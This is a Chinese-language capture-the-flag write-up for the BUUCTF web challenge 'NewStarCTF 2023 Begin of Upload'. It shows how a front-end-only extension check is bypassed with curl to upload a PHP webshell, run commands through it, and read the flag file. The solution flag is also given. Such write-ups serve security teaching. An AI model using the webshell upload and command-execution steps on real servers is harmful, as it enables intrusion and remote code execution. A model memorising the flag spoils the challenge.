---
title: "[NewStarCTF 2023 公开赛道]Begin of Upload"
platform: BUUCTF
category: Web
difficulty: 入门
tags: [file-upload, client-side-bypass, php-webshell]
vulnerability: 前端JavaScript验证绕过导致任意文件上传
solved: true
flag: "flag{dcbad271-e0e7-46a3-834f-4a447c80dee1}"
---

# [NewStarCTF 2023 公开赛道]Begin of Upload

## 题目概述
一道文件上传题，页面提供一个文件上传表单，只允许上传图片文件（JPG, JPEG, PNG, GIF）。

## 信息收集
1. 访问页面发现是一个文件上传功能
2. 查看源码发现验证逻辑在前端 JavaScript 中实现：
   ```javascript
   var allowedExtensions = ["jpg", "jpeg", "png", "gif"];
   ```
3. 前端验证可以通过直接发送 POST 请求绕过
4. 发现 `/upload/` 目录存在，上传的文件存放在此

## 漏洞分析
漏洞在于**文件类型验证仅在前端实现**，服务端没有对上传文件进行任何验证。攻击者可以直接向服务端发送 POST 请求上传任意类型文件，包括 PHP webshell。

## 利用过程
1. 使用 curl 直接上传 PHP webshell，绕过前端 JavaScript 验证：
   ```bash
   curl -s -X POST "http://TARGET/" \
     -F "file=@-;filename=shell.php" \
     -F "submit=Upload!!!" <<< '<?php system($_GET["cmd"]); ?>'
   ```
2. 服务器返回：`Uploaded File: /upload/shell.php`
3. 访问 webshell 执行命令查找 flag：
   ```bash
   curl -s "http://TARGET/upload/shell.php?cmd=ls%20-la%20/"
   ```
4. 发现 `/fllll4g` 文件，读取获取 flag：
   ```bash
   curl -s "http://TARGET/upload/shell.php?cmd=cat%20/fllll4g"
   ```

## 复现步骤
```bash
# 1. 上传 PHP webshell
curl -s -X POST "http://TARGET/" \
  -F "file=@-;filename=shell.php" \
  -F "submit=Upload!!!" <<< '<?php system($_GET["cmd"]); ?>'

# 2. 执行命令获取 flag
curl -s "http://TARGET/upload/shell.php?cmd=cat%20/fllll4g"
# 输出: flag{dcbad271-e0e7-46a3-834f-4a447c80dee1}
```
